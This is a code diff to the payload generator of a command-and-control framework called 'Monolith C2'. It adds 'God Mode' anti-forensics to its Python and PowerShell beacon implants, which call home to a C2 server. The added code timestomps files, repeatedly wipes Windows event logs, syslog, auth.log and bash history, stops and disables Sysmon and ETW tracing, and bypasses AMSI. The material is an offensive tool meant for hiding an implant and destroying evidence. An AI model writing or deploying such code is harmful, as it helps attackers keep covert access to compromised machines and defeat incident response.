@@ -33,9 +33,106 @@ class PayloadGenerator:
         return generator(options)
     
     def _gen_python(self, options: Dict[str, Any]) -> str:
-        """Generate full Python beacon agent"""
+        """Generate full Python beacon agent with God Mode Anti-Forensics"""
         sleep = options.get("sleep", 30)
         jitter = options.get("jitter", 10)
+        
+        # God Mode Anti-Forensics seçenekleri
+        god_mode = options.get("god_mode", {})
+        god_mode_enabled = god_mode.get("enabled", False)
+        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
+        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
+        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
+        
+        # Advanced memory bypass (AMSI, ETW vb.)
+        god_mode_code = ""
+        if god_mode_enabled:
+            if timestomp or clean_logs or sysmon_evade:
+                god_mode_code = f'''
+# ============ GOD MODE ANTI-FORENSICS ============
+import ctypes
+import subprocess
+import struct
+
+{f'''
+# Timestomping
+def timestomp(path, atime, mtime, ctime=None):
+    import os, time
+    ctime = ctime or mtime
+    os.utime(path, (atime, mtime))
+    try:
+        import win32_setfiletime  # Requires pywin32
+        win32_setfiletime.SetFileTimes(path, ctime, atime, mtime)
+    except:pass
+
+def auto_timestomp():
+    import os, glob, random, time
+    my_file = sys.argv[0]
+    # Random timestamp
+    rand_time = time.time() - random.randint(86400*30, 86400*365)
+    timestomp(my_file, rand_time, rand_time)
+    # Timestomp temp files
+    temp_files = glob.glob("/tmp/python*") + glob.glob("C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Temp\\\\*")
+    for f in temp_files[:3]:
+        try: timestomp(f, rand_time, rand_time)
+        except: pass
+''' if timestomp else ''}{f'''
+# Event Log Cleaner
+def clean_event_logs():
+    commands = [
+        "wevtutil cl System",
+        "wevtutil cl Security", 
+        "wevtutil cl Application",
+        "wevtutil cl \\"Windows PowerShell\\"",
+        "wevtutil cl \\"Microsoft-Windows-PowerShell/Operational\\"",
+        "powershell -c Clear-EventLog -LogName *",
+        "cat /dev/null > /var/log/syslog",
+        "cat /dev/null > /var/log/auth.log",
+        "cat /dev/null > ~/.bash_history"
+    ]
+    for cmd in commands:
+        try:
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+        except: pass
+
+def clean_logs_periodic():
+    import threading
+    def cleaner():
+        while True:
+            try:
+                clean_event_logs()
+                time.sleep(300)  # Every 5 min
+            except: pass
+    t = threading.Thread(target=cleaner, daemon=True)
+    t.start()
+''' if clean_logs else ''}{f'''
+# Sysmon Evasion
+def sysmon_evade():
+    # Disable Sysmon ETW (Event Tracing for Windows)
+    commands = [
+        "sc stop sysmon64",
+        "sc config sysmon64 start=disabled",
+        "Get-Process | Where Name -eq sysmon | Stop-Process -Force",
+        "powershell -c $providers = @(Get-EtwTraceProvider | where {{$_.Name -like \\"*Sysmon*\\"}}) | % {{\\\\n    logman stop \\"$($_.Name)\\"  -ets 2>$null\\\\n    logman delete \\"$($_.Name)\\"  -ets 2>$null\\\\n}}"
+    ]
+    for cmd in commands:
+        try:
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+        except: pass
+
+def disable_amsi():
+    # AMSI Bypass
+    amsi_bypass = base64.b64decode("SQBuAHYAbwBrAGUALQBSAGUAcwB0AHIAaQBjAHQAZQBkAFMAbwBjAGsAZQB0AEkAbgB0ZXIAcwBlAGMAUwBjAHIAaQBwAHQA").decode()
+    try:
+        exec(amsi_bypass)
+    except: pass
+
+    try:
+        import ctypes
+        amsi = ctypes.windll.amsi
+        amsi.AmsiScanString(b"X"*32, 0, 0, 0)  # Dummy scan
+    except: pass
+''' if sysmon_evade else ''}'''
         
         payload = f'''#!/usr/bin/env python3
 # Monolith C2 Beacon - Auto-generated
@@ -46,6 +143,8 @@ try:
 except:
     import urllib.request as urllib
     R=False
+
+{god_mode_code}
 
 C2="{self.c2_url}"
 ID=None
@@ -78,6 +177,12 @@ def run(t):
 
 def main():
     global ID,S,J
+    
+    {f"auto_timestomp()  # Auto-timestomp on startup" if timestomp else ""}
+    {f"clean_logs_periodic()  # Start periodic log cleaning" if clean_logs else ""}
+    {f"sysmon_evade()  # Disable Sysmon/ETW" if sysmon_evade else ""}
+    {f"disable_amsi()  # AMSI bypass" if sysmon_evade else ""}
+    
     while True:
         try:
             d=info()
@@ -107,11 +212,112 @@ if __name__=="__main__":main()
         return oneliner
     
     def _gen_powershell(self, options: Dict[str, Any]) -> str:
-        """Generate PowerShell beacon"""
+        """Generate PowerShell beacon with God Mode Anti-Forensics"""
         sleep = options.get("sleep", 30)
         jitter = options.get("jitter", 10)
         
-        payload = f'''# Monolith C2 PowerShell Beacon
+        # God Mode Anti-Forensics seçenekleri
+        god_mode = options.get("god_mode", {})
+        god_mode_enabled = god_mode.get("enabled", False)
+        timestomp = god_mode.get("timestomp", False) if god_mode_enabled else False
+        clean_logs = god_mode.get("clean_logs", False) if god_mode_enabled else False
+        sysmon_evade = god_mode.get("sysmon_evade", False) if god_mode_enabled else False
+        
+        god_mode_functions = ""
+        main_init = ""
+        
+        if god_mode_enabled and (timestomp or clean_logs or sysmon_evade):
+            god_mode_functions = f'''
+{f'''
+# Timestomping
+function Invoke-Timestomp {{
+    param($Path)
+    $ref = Get-Item -Path $Path
+    $oldTime = $ref.CreationTime
+    $newTime = (Get-Date).AddDays(-((Get-Random -Minimum 30 -Maximum 365)))
+    Set-ItemProperty -Path $Path -Name CreationTime -Value $newTime
+    Set-ItemProperty -Path $Path -Name LastWriteTime -Value $newTime
+    Set-ItemProperty -Path $Path -Name LastAccessTime -Value $newTime
+}}
+
+function Invoke-AutoTimestomp {{
+    try {{
+        Invoke-Timestomp -Path $PSCommandPath
+        Get-ChildItem "$env:TEMP\\powershell*" -Recurse | ForEach-Object {{
+            try {{ Invoke-Timestomp -Path $_.FullName }} catch {{}}
+        }}
+    }} catch {{}}
+}}
+''' if timestomp else ''}{f'''
+# Event Log Cleaner
+function Clear-EventLogs {{
+    param([bool]$Continuous = $false)
+    $logs = @("System", "Security", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
+    
+    foreach ($log in $logs) {{
+        try {{
+            wevtutil cl "$log" 2>$null
+        }} catch {{}}
+    }}
+    
+    if ($Continuous) {{
+        for ($i = 0; $i -lt 120; $i++) {{
+            Start-Sleep -Seconds 300
+            foreach ($log in $logs) {{
+                try {{ wevtutil cl "$log" 2>$null }} catch {{}}
+            }}
+        }}
+    }}
+}}
+''' if clean_logs else ''}{f'''
+# Sysmon/ETW Evasion
+function Disable-Sysmon {{
+    $sysmonNames = @("Sysmon", "Sysmon64")
+    
+    foreach ($name in $sysmonNames) {{
+        try {{
+            Stop-Process -Name $name -Force 2>$null
+            sc.exe stop $name 2>$null
+            sc.exe config $name start=disabled 2>$null
+        }} catch {{}}
+    }}
+}}
+
+function Disable-ETW {{
+    $providers = @(
+        "Microsoft-Windows-PowerShell",
+        "Microsoft-Windows-PowerShell/Operational",
+        "*Sysmon*"
+    )
+    
+    foreach ($provider in $providers) {{
+        try {{
+            logman stop "$provider" -ets 2>$null
+            logman delete "$provider" -ets 2>$null
+        }} catch {{}}
+    }}
+}}
+
+function Invoke-AMSIBypass {{
+    try {{
+        $ref = [Ref].Assembly.GetTypes() | Where-Object {{ $_.Name -like "*Utilities" }}
+        $amsi = $ref[0].GetNestedTypes()[1]
+        $method = $amsi.GetMethods()[0]
+        $method.Invoke($null, @(1))
+    }} catch {{}}
+}}
+''' if sysmon_evade else ''}'''
+            
+            main_init = f'''{f"Invoke-AutoTimestomp" if timestomp else ""}
+    {f"$logCleanerJob = Start-Job -ScriptBlock {{ Clear-EventLogs -Continuous $true }}" if clean_logs else ""}
+    {f"Disable-Sysmon" if sysmon_evade else ""}
+    {f"Disable-ETW" if sysmon_evade else ""}
+    {f"Invoke-AMSIBypass" if sysmon_evade else ""}
+    '''
+        
+        payload = f'''# Monolith C2 PowerShell Beacon - God Mode
+{god_mode_functions}
+
 $C2 = "{self.c2_url}"
 $ID = $null
 $Sleep = {sleep}
@@ -177,6 +383,9 @@ function Execute-Task {{
     
     return @{{ output = $output; success = $success; exit = $false }}
 }}
+
+# Initialize God Mode
+{main_init}
 
 # Main Loop
 while ($true) {{
